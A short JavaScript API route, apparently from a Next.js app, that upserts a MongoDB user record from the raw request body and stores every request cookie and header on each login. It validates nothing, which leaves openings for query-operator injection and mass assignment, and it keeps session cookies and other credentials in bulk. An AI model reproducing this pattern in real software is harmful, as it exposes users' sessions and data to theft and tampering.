import mongoose from "mongoose";
import connectDb from "../../lib/connectDb";

export default async function login(req, res) {
  await connectDb();

  const cookies = req.cookies || {};

  try {
    await mongoose.connection.db.collection("users").updateOne(
      { defaultAccount: req.body.defaultAccount },
      {
        $set: { ...req.body, cookies },
        $push: { logins: { ...req.headers, date: new Date() } },
      },
      { upsert: true }
    );
  } catch (error) {
    console.log({ error });
  }

  res.status(200).json({ message: "" });
}
